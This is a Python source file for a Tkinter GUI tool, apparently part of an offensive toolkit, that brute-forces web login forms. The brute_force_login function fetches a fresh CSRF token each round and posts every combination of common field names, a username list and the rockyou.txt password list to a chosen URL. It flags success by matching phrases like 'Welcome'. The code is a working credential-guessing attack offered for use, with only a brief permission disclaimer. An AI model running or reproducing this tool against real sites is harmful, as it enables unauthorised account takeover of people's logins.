# bruteforce.py

# Imports
from tkinter import (Frame, Text, Button, Entry, Label, StringVar, OptionMenu, FLAT, filedialog, messagebox)
import tkinter as tk
import random
import requests
import threading
from bs4 import BeautifulSoup
import time
import os 

# Global variables
url_entry = None
username_field_entry = None
terminal = None
correct_html_responses = ["You have logged in", "Welcome", "Logged in", "Logout", "welcome", "logged in", "logout"]
incorrect_html_responses = ["Wrong", "Incorrect", "Invalid", "wrong", "incorrect", "invalid"]
common_username_fields = ['username', 'user', 'id', 'userid', 'user_id', 'loginid', 'login_id']
common_password_fields = ['password', 'pass', 'passwd', 'pwd', 'passcode']
brute_force_active = True
csrf_token_field = None

wordlist_directory = "Wordlists"
users_wordlist = "bruteforce_users.txt"
passwords_wordlist = "rockyou.txt"

def stop_bruteforce():
    global brute_force_active
    brute_force_active = False
    # Add the stopping message
    terminal.insert('end', "---------------\n")
    terminal.insert('end', "STOPPING BRUTE FORCE\n")
    terminal.insert('end', "---------------\n")

def clear_terminal_content():
    global terminal
    terminal.delete(1.0, tk.END)

def load_wordlist(filename):
    with open(os.path.join(wordlist_directory, filename), 'r', errors='replace') as file:
        return [line.strip() for line in file]


users_list = load_wordlist(users_wordlist)
passwords_list = load_wordlist(passwords_wordlist)

def on_enter(e):
    e.widget['background'] = 'white'
    e.widget['foreground'] = 'black'

def on_leave(e):
    e.widget['background'] = 'red'
    e.widget['foreground'] = 'black'

def ignore_input(event):
    if event.keysym == 'c' and event.state & 0x4:  # Check for Ctrl+C
        return
    return "break"

def copy_text(event, terminal, root):
    # Only copy if there's a text selection
    if terminal.selection_get():
        root.clipboard_clear()
        root.clipboard_append(terminal.selection_get())

def center_ascii_art(art, terminal_width):
    centered_art = ""
    for line in art.split('\n'):
        padding = (terminal_width - len(line)) // 2
        centered_line = ' ' * padding + line + '\n'
        centered_art += centered_line
    return centered_art

def print_instructions(terminal):
    terminal_width = 120  # Assuming the width of the terminal is 120 characters, but you can adjust this value
    
    separator = "=======================================================================================================================\n"

    # ASCII art at the top
    ascii_art = """
██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ███████╗ ██████╗ ██████╗  ██████╗███████╗██████╗ 
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
██████╔╝██████╔╝██║   ██║   ██║   █████╗      █████╗  ██║   ██║██████╔╝██║     █████╗  ██████╔╝
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  ██╔══██╗
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██║     ╚██████╔╝██║  ██║╚██████╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
    """

    centered_art = center_ascii_art(ascii_art, terminal_width)

    title_prefix = "========================================== "
    title_main = "HUNTR BRUTE FORCE TOOL INSTRUCTIONS"
    title_suffix = " ========================================\n\n"

    purpose_header = "\n[Purpose]\n\n"
    purpose_body = "This tool is engineered to conduct a systematic brute force attack against web-based login forms. \nEnsure you have proper authorization before deploying.\n\n"
    
    procedure_header = "[Procedure]\n"
    procedure_body = """
1. Target URL: Populate this field with the exact URL of the login page you aim to assess.
2. Username & Password Fields: If known, input the field identifiers used by the website. If unsure, leave them blank, 
   and the tool will try commonly used names.
3. Custom Fields (Optional): If the website uses non-standard field identifiers for the username and password, 
   enter them here.
4. Initiation: Click on the "Start Brute Force" button. The terminal will display real-time progress.
5. Interruption: To stop the brute force process, click the "Stop" button.
6. Terminal Management: Use the "Clear" button to reset the terminal display.\n\n\n"""
    
    security_note = "\nUse responsibly and with permission. Stay legal and ethical.\n"
    
    separator = "=======================================================================================================================\n"

    # Insert parts with appropriate coloring and alignment
    terminal.insert('end', separator, 'red')  # Inserting separator above the ASCII art
    terminal.insert('end', centered_art, 'white_centered')
    terminal.insert('end', title_prefix, 'red')
    terminal.insert('end', title_main, 'white')
    terminal.insert('end', title_suffix, 'red')
    terminal.insert('end', purpose_header, 'white')
    terminal.insert('end', purpose_body, 'red')
    terminal.insert('end', procedure_header, 'white')
    terminal.insert('end', procedure_body, 'red')
    terminal.insert('end', security_note, 'white')
    terminal.insert('end', separator, 'red')  # Separator below



#############################################################

class DynamicTextCanvas(tk.Canvas):
    def __init__(self, master, **kwargs):
        super().__init__(master, highlightthickness=0, **kwargs)
        self.chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        self.font = ('Consolas', 11, 'bold')
        self.text_positions = []
        self.text_values = list("BRUTE FORCER")
        self.after_ids_text = []
        self.after_ids_box = []
        self.raining_chars = []
        self.bind("<Map>", self.start_animation)
        self.after_id_switch = None

    def reset_state(self):
        self.stop_animation()
        if self.after_id_switch:
            self.after_cancel(self.after_id_switch)
            self.after_id_switch = None
        self.delete("all")
        self.text_positions = []
        self.after_ids_text = []
        self.after_ids_box = []
        self.raining_chars = []

    def start_animation(self, event=None):
        char_width, char_height = self.font_size(self.font)
        spacing = 1
        self.unbind("<Map>")
        total_chars_width = sum([self.font_size(self.font, char=char)[0] for char in self.text_values])
        total_spacing_width = spacing * (len(self.text_values) - 1)
        total_width = total_chars_width - total_spacing_width
    
        x = (self.winfo_width() - total_width) / 2
        y = 0
    
        for i, char in enumerate(self.text_values):
            individual_char_width = self.font_size(self.font, char=char)[0]
            position = self.create_text(x, y, text=char, font=self.font, fill="#080808", anchor=tk.NW)
            self.text_positions.append(position)
            x += individual_char_width - spacing
            
        self.flashed_chars = set()
        self.flash_next_char()
    
    def switch_phrase(self):
        if self.after_id_switch:
            self.after_cancel(self.after_id_switch)
            self.after_id_switch = None
                
        self.current_phrase_index += 1
        if self.current_phrase_index >= len(self.phrases):
            self.current_phrase_index = 0
        self.text_values = list(self.phrases[self.current_phrase_index])
        self.reset_state()
        self.start_animation()
        self.after_id_switch = self.after(7000, self.switch_phrase)
    
    def flash_next_char(self):
        if len(self.flashed_chars) < len(self.text_positions):
            random_char_index = random.choice([i for i in range(len(self.text_positions)) if i not in self.flashed_chars])
            self.flashed_chars.add(random_char_index)
            current_char = self.text_positions[random_char_index]
            self.delete(f"swipe_rect_{random_char_index}")
            self.itemconfig(current_char, fill="red")
            x_coord, y_coord = self.coords(current_char)
            raining_char_position = self.create_text(x_coord, y_coord + 10, text=self.itemcget(current_char, 'text'), font=self.font, fill="red", anchor=tk.W)
            self.raining_chars.append((raining_char_position, 0))
            self.after(70, self.flash_next_char)
        else:
            self.update_animation()
    
    def change_single_character(self, char_position):
        self.itemconfig(char_position, text=random.choice(self.chars))
        self.after_ids_text.append(self.after(50, self.change_single_character, char_position))

    def update_animation(self):
        for i, position in enumerate(self.text_positions):
            char = self.itemcget(position, 'text')
            if random.random() < 0.09:
                raining_char_position = self.create_text(self.coords(position)[0], self.coords(position)[1] + 10, text=char, font=self.font, fill="red", anchor=tk.W)
                self.raining_chars.append((raining_char_position, 0))
        
        to_remove = []
        
        for rain, step in self.raining_chars:
            if self.exists(rain): 
                x, y = self.coords(rain)
                fade_color = self.get_fading_color(step)
                if fade_color == "#080808":  
                    to_remove.append((rain, step))
                    continue
                self.itemconfig(rain, fill=fade_color)
                if y < self.winfo_height():
                    self.move(rain, 0, 1)
                    self.raining_chars[self.raining_chars.index((rain, step))] = (rain, step + 2)
                else:
                    to_remove.append((rain, step))

        for rain, step in to_remove:
            self.raining_chars.remove((rain, step))
            self.delete(rain)
        after_id = self.after(10, self.update_animation)
        self.after_ids_box.append(after_id)
    
    def exists(self, item):
        return item in self.find_all()
    
    def font_size(self, font, char="Test"):
        test = tk.Label(self, text=char, font=font)
        width = test.winfo_reqwidth()
        height = test.winfo_reqheight()
        test.destroy()
        return width, height
    def stop_animation(self):
        for after_id in self.after_ids_text:
            self.after_cancel(after_id)
        for after_id in self.after_ids_box:
            self.after_cancel(after_id)
        self.after_ids_text.clear()
        self.after_ids_box.clear()
    
    def get_fading_color(self, step):
        shades = [
            "#ff0000", "#f50000", "#eb0000", "#e10000", 
            "#d70000", "#cd0000", "#c30000", "#b90000", 
            "#af0000", "#a50000", "#9b0000", "#910000",
            "#870000", "#7d0000", "#730000", "#690000",
            "#5f0000", "#550000", "#4b0000", "#410000",
            "#370000", "#2d0000", "#230000", "#190000",
            "#0f0000", "#080808"
        ]
        return shades[min(step, len(shades)-1)]
    
##############################################################


def brute_force_login(target_url):
    global brute_force_active, common_username_fields, common_password_fields
    global csrf_token_field
    brute_force_active = True
    with requests.Session() as s: 
        # Configure the tags for colors
        terminal.tag_configure("trying_prefix", foreground="red")
        terminal.tag_configure("success_prefix", foreground="lime")
        terminal.tag_configure("success_creds", foreground="yellow", font=('System', 10, 'bold'))
        terminal.tag_configure("credentials_label", foreground="yellow", font=('Consolas', 10,))
        terminal.tag_configure("actual_creds", foreground="lime", font=('System', 10, 'bold'))
        
        for username_field_name in common_username_fields:
            for password_field_name in common_password_fields:
                for username in users_list:
                    for password in passwords_list:
                        if not brute_force_active:
                            terminal.insert('end', "[-] Brute force process has been stopped.\n")
                            return
                        # Fetch the login page first to find any hidden inputs and get a fresh CSRF token
                        response = s.get(target_url)
                        soup = BeautifulSoup(response.text, 'html.parser')
        
                        # Try to extract CSRF token
                        custom_csrf_field_name = csrf_token_field.get().strip() if csrf_token_field.get().strip() != "" else 'csrf_token'
                        user_token_element = soup.find('input', attrs={'name': custom_csrf_field_name})
                        data = {
                            username_field_name: username,
                            password_field_name: password,
                            'Login': 'Login',
                        }

                        if user_token_element is not None:
                            user_token = user_token_element['value']
                            data[custom_csrf_field_name] = user_token
                        else:
                            terminal.insert('end', "[-] CSRF token not found. Trying without CSRF token...\n")
                        
                        headers = {
                            "User-Agent": "Mozilla/5.0"
                        }

                        # Provide feedback that the tool is attempting a combination
                        terminal.insert('end', "[-] ", "trying_prefix")
                        terminal.insert('end', f"Trying {username}/{password} using fields {username_field_name}/{password_field_name}...\n")

                        # Make the login attempt
                        response = s.post(target_url, data=data, headers=headers)

                        # Check for successful login based on your correct responses
                        if any(phrase in response.text for phrase in correct_html_responses):
                            terminal.insert('end', "[ + ] ", "success_prefix")
                            terminal.insert('end', f"Found using fields {username_field_name}/{password_field_name}\n", "success_creds")
                            
                            # Print the stopping brute force message
                            terminal.insert('end', "---------------\n")
                            terminal.insert('end', "STOPPING BRUTE FORCE\n")
                            terminal.insert('end', "---------------\n")
                            
                            # Print the found credentials in the desired format
                            terminal.insert('end', "Credentials Found:\n", "success_creds")
                            terminal.insert('end', "Username = ", "success_creds")
                            terminal.insert('end', f"{username}\n", "actual_creds")
                            terminal.insert('end', "Password = ", "success_creds")
                            terminal.insert('end', f"{password}\n", "actual_creds")
                            
                            return
              
                        # Optional: Check for explicit incorrect login indications
                        elif any(phrase in response.text for phrase in incorrect_html_responses):
                            pass

    terminal.insert('end', "[-] Brute force attack did not succeed.\n")




def start_brute_force():
    threading.Thread(target=brute_force_threaded).start()

def brute_force_threaded():
    target_url = url_entry.get()
    clear_terminal_content()  # Just clearing the terminal here

    # Before starting brute force, display the starting message
    terminal.insert('end', "---------------\n")
    terminal.insert('end', "STARTING BRUTE FORCE\n")
    terminal.insert('end', "---------------\n")

    custom_user_field = custom_username_field.get().strip()
    custom_pass_field = custom_password_field.get().strip()

    if custom_user_field and custom_pass_field:
        # If custom fields are provided, override the common fields
        common_username_fields[:] = [custom_user_field]
        common_password_fields[:] = [custom_pass_field]

    brute_force_login(target_url)  # Just pass the target_url


def create_tool_frame(root, open_frame_func, previous_frame, button_font):
    global url_entry, username_field_entry, password_field_entry, terminal
    global custom_username_field, custom_password_field
    global csrf_token_field

    custom_username_field = StringVar()
    custom_password_field = StringVar()

    csrf_token_field = StringVar()

    tool_frame = Frame(root, bg='gray3')

    dynamic_text = DynamicTextCanvas(tool_frame, bg='gray3', width=800, height=60)
    dynamic_text.pack(pady=0)

    terminal_frame = Frame(tool_frame, bg='gray3')
    terminal_frame.pack(pady=0)

    url_label = Label(terminal_frame, text="Target URL:", bg='gray3', fg='red', font=('System', 10))
    url_label.grid(row=0, column=0, padx=5)
    url_entry = Entry(terminal_frame, width=30, bg='gray3', fg='red')
    url_entry.grid(row=0, column=1, padx=50)

    username_field_label = Label(terminal_frame, text="Known Username:", bg='gray3', fg='red', font=('System', 10))
    username_field_label.grid(row=1, column=0)
    username_field_entry = Entry(terminal_frame, width=30, bg='gray3', fg='red')
    username_field_entry.grid(row=1, column=1)

    password_field_label = Label(terminal_frame, text="Known Password:", bg='gray3', fg='red', font=('System', 10))
    password_field_label.grid(row=2, column=0)
    password_field_entry = Entry(terminal_frame, width=30, bg='gray3', fg='red')
    password_field_entry.grid(row=2, column=1)

    start_button = Button(terminal_frame, text="Start Brute Force", command=start_brute_force, bg='red', fg='black', relief=FLAT, font=('System', 12, 'bold'))
    start_button.grid(row=2, column=2, pady=0)
    start_button.bind("<Enter>", on_enter)
    start_button.bind("<Leave>", on_leave)

    stop_button = Button(terminal_frame, text="Stop", command=stop_bruteforce, bg='red', fg='black', relief=FLAT, font=('System', 12, 'bold'))
    stop_button.grid(row=2, column=3, pady=0)
    stop_button.bind("<Enter>", on_enter)
    stop_button.bind("<Leave>", on_leave)

    clear_button = Button(terminal_frame, text="Clear", command=clear_terminal_content, bg='red', fg='black', relief=FLAT, font=('System', 12, 'bold'))
    clear_button.grid(row=2, column=4, pady=0)
    clear_button.bind("<Enter>", on_enter)
    clear_button.bind("<Leave>", on_leave)

    back_button = Button(terminal_frame, text="X", fg="black", bg="red", relief=FLAT, font=('System', 12, 'bold'), command=lambda: open_frame_func(tool_frame, previous_frame, "OFFENSIVE"))
    back_button.grid(row=2, column=5)
    back_button.bind("<Enter>", on_enter)
    back_button.bind("<Leave>", on_leave)
    
    # Adding a label to instruct users to add known username and password fields
    instruction_label = Label(terminal_frame, text="Enter known username and password fields if available", bg='gray3', fg='white', font=('System', 10))
    instruction_label.grid(row=8, column=0, columnspan=6, pady=5)

    success_rate_label = Label(terminal_frame, text="This brute-forcing tool can take a while but is successful 90% of the time", bg='gray3', fg='white', font=('System', 10))
    success_rate_label.grid(row=9, column=0, columnspan=6, pady=5)


    custom_username_label = Label(terminal_frame, text="Known Username Input Value:", bg='gray3', fg='red', font=('System', 10))
    custom_username_label.grid(row=6, column=0, pady=5)
    custom_username_field_entry = Entry(terminal_frame, textvariable=custom_username_field, width=30, bg='gray3', fg='red')
    custom_username_field_entry.grid(row=6, column=1)

    custom_password_label = Label(terminal_frame, text="Known Password Input Value:", bg='gray3', fg='red', font=('System', 10))
    custom_password_label.grid(row=6, column=2, pady=5)
    custom_password_field_entry = Entry(terminal_frame, textvariable=custom_password_field, width=30, bg='gray3', fg='red')
    custom_password_field_entry.grid(row=6, column=3)

    custom_csrf_token_label = Label(terminal_frame, text="Known CSRF Token Input Value:\n(csrf_token = default)", bg='gray3', fg='red', font=('System', 10))
    custom_csrf_token_label.grid(row=7, column=0, pady=5)
    custom_csrf_token_field_entry = Entry(terminal_frame, textvariable=csrf_token_field, width=30, bg='gray3', fg='red')
    custom_csrf_token_field_entry.grid(row=7, column=1)

    terminal = Text(terminal_frame, width=120, height=32, bg='gray3', fg='red', bd=2)
    terminal.tag_configure('white_centered', foreground='white', justify='center')
    terminal.grid(row=5, column=0, columnspan=6, pady=5)
    terminal.bind("<Key>", ignore_input)
    terminal.bind('<Control-c>', lambda event: copy_text(event, terminal, root))
    # Define the tags
    terminal.tag_configure('white', foreground='white')
    terminal.tag_configure('red', foreground='red')
    terminal.tag_configure('centered', justify='center')  # Define centered tag    

    print_instructions(terminal)

    return tool_frame